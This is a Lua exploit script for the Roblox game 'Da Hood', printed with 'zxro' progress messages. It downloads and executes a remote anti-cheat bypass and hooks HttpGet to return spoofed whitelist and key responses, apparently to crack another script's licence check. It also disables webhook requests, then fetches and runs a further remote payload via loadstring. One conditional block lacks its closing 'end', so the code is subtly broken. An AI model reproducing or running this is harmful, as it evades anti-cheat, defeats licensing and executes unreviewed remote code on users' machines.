print('zxro - ac bypass in progress')

loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Games/Da%20Hood/AntiCheatBypass.lua"))()

print('zxro - ac bypass complete, moving onto hook')

local old
old = hookfunction(game.HttpGet, function(self, url)
    if type(url) == "string" then
        if string.match(url, "ifFZVIKsziuM9un7dxEroDbzYOkHzWVt") or string.match(url, "eu3YJwdqJU9TsuSV34OlTbxWHiCTjVxO") then
                return game:HttpGet("https://raw.githubusercontent.com/pxvv9/others/main/wl")
        end
        if string.match(url, "hWqJG9NJ37TPEQR6OP5LXODHnkR6lPei") then
            return "hYz6LTxgBP"
        end
        if string.match(url, "7HT52lTFukTauFXYJWyd7dhZGd7CoDEl") then
            return game:HttpGet("https://raw.githubusercontent.com/pxvv9/others/main/Notify")
        end
        if string.match(url, "alert") and string.match(url, "XK5NG") then
            return game:HttpGet("https://raw.githubusercontent.com/pxvv9/others/main/alert")
        end
        if string.match(url, "Annc") and string.match(url, "XK5NG") then
            return game:HttpGet("https://raw.githubusercontent.com/pxvv9/others/main/annc")
        end
        if string.match(url, "uG7YfIn5Rlw2i5X5zNROZde5bIngmXNb") then
            return "oJHAtRRmnsztfcMBXVkoJEX8TrsRh1wg"
        end
        if string.match(url, "sDUwcTOqcPpqMBfLGwroe8vyq5Dpsb3D") then
            return "return {}"
        if string.match(url, "raw%.githubusercontent%.com/zxrorocks/test%-repo/main/test") then
            return "nah"
        end
        if not string.match(url, "zxrorocks") and not string.match(url, "pxvv9") then
            print(url)
            return old(self, url)
        end
    end
    return old(self, url)
end)


local old = http_request
http_request = function(x)
    return "No." -- prevents webhook requests
end

local old = http.request
http.request = function(x)
    return "No." -- prevents webhook requests
end
      
print('zxro - hooking complete, moving onto test')

if game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo/main/test") ~= "nah" then
    game.Players.LocalPlayer:Kick("Your executor does not support hookfunction (💀)")
    return -- halts anything further
end

print('zxro - test complete, have fun')

loadstring(game:HttpGet("https://raw.githubusercontent.com/zxrorocks/test-repo/main/BrandonCertified"))()
